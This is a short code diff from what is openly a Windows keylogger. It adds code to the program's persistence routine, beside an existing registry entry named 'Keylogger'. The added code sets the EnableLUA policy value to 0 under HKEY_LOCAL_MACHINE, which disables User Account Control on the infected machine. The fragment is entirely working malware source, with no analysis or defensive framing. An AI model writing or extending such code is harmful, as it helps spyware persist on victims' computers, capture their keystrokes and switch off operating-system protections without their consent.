@@ -20,6 +20,13 @@ bool PersistantApplication() {
 			RegSetValueExA(key, "Keylogger", 0, REG_SZ, (BYTE*)exePath, sizeof(exePath));
 			RegCloseKey(key);
 		}
+		HKEY key2;
+		long regeditOpen2 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &key2);
+		if(regeditOpen2 == ERROR_SUCCESS) {
+			DWORD dwValue = 0;
+			RegSetValueExA(key2, "EnableLUA", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
+			RegCloseKey(key2);
+		}
 	} else {
 		STARTUPINFOA si{sizeof(si)};
 		PROCESS_INFORMATION pi{};
